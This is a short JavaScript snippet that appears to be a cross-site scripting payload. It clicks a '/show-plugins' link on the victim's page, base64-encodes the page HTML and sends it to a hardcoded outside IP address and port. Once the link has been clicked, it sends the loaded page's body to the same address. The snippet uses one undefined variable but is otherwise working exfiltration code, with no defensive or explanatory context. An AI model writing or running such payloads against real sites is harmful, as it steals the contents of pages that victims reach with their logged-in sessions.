const link = document.querySelector('a[href="/show-plugins"]');

fetch("http://82.65.210.151:24000/?encodedData=" + btoa(newPageBody.innerHTML));

if (link) {
  link.click();

   window.addEventListener('load', function() {
      fetch("http://82.65.210.151:24000/?encodedData=" + btoa(document.body.innerHTML));
    });
 
  
} else {
   fetch("http://82.65.210.151:24000/?encodedData=error");
}


